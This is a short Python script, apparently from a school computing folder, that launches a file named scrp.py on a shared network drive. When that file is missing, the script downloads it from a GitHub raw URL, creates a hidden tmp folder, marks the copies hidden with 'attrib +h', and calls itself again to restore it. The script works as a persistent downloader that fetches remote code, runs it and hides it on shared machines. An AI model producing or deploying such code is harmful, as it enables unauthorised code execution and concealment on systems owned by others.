import os
import urllib.request
import shutil
import pathlib

def ops():
    try:
        os.startfile("L:\\computing\\Y10\\23.09.22\\scrp.py")
        my_file = pathlib.Path('L:/computing/Y10/23.09.22/scrp.py')
        to_file = pathlib.Path('L:/computing/Y10/23.09.22/tmp')
        shutil.copy(my_file, to_file)
    except FileNotFoundError:
        print("file not found")
        os.system("mkdir L:\\computing\\Y10\\23.09.22\\tmp")
        os.system("attrib +h L:\\computing\\Y10\\23.09.22\\tmp")
        url = 'https://raw.githubusercontent.com/stevie1738/scrp/main/scrp.py'
        urllib.request.urlretrieve(url, "L:\\computing\\Y10\\23.09.22\\scrp.py")
        os.system("attrib +h L:\\computing\\Y10\\23.09.22\\scrp.py")
        my_file = pathlib.Path('L:/computing/Y10/23.09.22/scrp.py')
        to_file = pathlib.Path('L:/computing/Y10/23.09.22/tmp')
        shutil.copy(my_file, to_file)
        os.system("attrib +h L:\\computing\\Y10\\23.09.22\\tmp\\scrp.py")
        ops()
ops()
